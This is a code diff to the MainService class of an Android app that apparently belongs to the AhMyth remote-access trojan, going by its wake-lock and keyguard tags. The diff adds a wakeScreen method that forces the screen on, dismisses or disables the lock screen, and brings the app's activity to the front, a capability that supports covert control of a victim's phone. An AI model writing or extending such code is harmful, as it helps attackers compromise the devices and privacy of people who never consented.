@@ -17,6 +17,8 @@ import android.os.Looper;
 import android.os.PowerManager;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
+import android.app.KeyguardManager;
+import android.view.WindowManager;
 
 import java.lang.reflect.Method;
 
@@ -423,5 +425,53 @@ public class MainService extends Service {
     public void onTrimMemory(int level) {
         super.onTrimMemory(level);
         Log.d(TAG, "Trim memory level: " + level);
+    }
+
+    public void wakeScreen() {
+        Log.d(TAG, "Waking screen up...");
+        try {
+            // Get power manager
+            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (powerManager == null) {
+                Log.e(TAG, "Failed to get PowerManager");
+                return;
+            }
+
+            // Acquire a screen-bright wake lock
+            PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
+                PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
+                PowerManager.ACQUIRE_CAUSES_WAKEUP |
+                PowerManager.ON_AFTER_RELEASE,
+                "AhMyth::ScreenWakeLock"
+            );
+            wakeLock.acquire(10000); // 10 second timeout
+
+            // Dismiss keyguard
+            KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+            if (keyguardManager != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    keyguardManager.requestDismissKeyguard(null, null);
+                } else {
+                    KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("AhMyth");
+                    keyguardLock.disableKeyguard();
+                }
+            }
+
+            // Bring MainActivity to front
+            Intent intent = new Intent(this, MainActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            startActivity(intent);
+
+            // Release wake lock after a short delay
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                if (wakeLock.isHeld()) {
+                    wakeLock.release();
+                    Log.d(TAG, "Screen wake lock released");
+                }
+            }, 5000);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error waking screen", e);
+        }
     }
 }
